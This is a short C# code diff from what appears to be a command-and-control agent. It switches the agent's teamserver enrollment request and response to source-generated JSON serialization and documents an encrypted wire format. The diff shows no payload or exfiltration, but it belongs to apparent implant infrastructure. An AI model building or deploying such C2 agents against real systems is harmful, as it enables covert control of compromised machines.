@@ -213,7 +213,7 @@ internal static class C2
         // sends the JSON document. The wire layout is the teamserver's
         // contract: b"R1" || keyId(16) || nonce(12) || ciphertext || tag(16),
         // base64 in a JSON string.
-        var json = System.Text.Json.JsonSerializer.Serialize(body);
+        var json = System.Text.Json.JsonSerializer.Serialize(body, EnrollJsonContext.Default.EnrollRequest);
         string payload;
         if (profile.IsAesGcmEnvelope)
         {
@@ -246,7 +246,8 @@ internal static class C2
         using var response = await http.PostAsync(enrollUrl, content, cancellationToken);
         // The teamserver returns 200 on OK and 401 on a token failure, both with
         // an EnrollmentResponse body. Read the body either way.
-        var er = await response.Content.ReadFromJsonAsync<EnrollResponse>(cancellationToken: cancellationToken)
+        var er = await response.Content.ReadFromJsonAsync(
+                EnrollJsonContext.Default.EnrollResponse, cancellationToken)
             ?? throw new EnrollRejectedException("enroll returned an empty body");
         if (er.Status != EnrollStatus.Ok)
             throw new EnrollRejectedException($"enroll rejected: status {er.Status}");
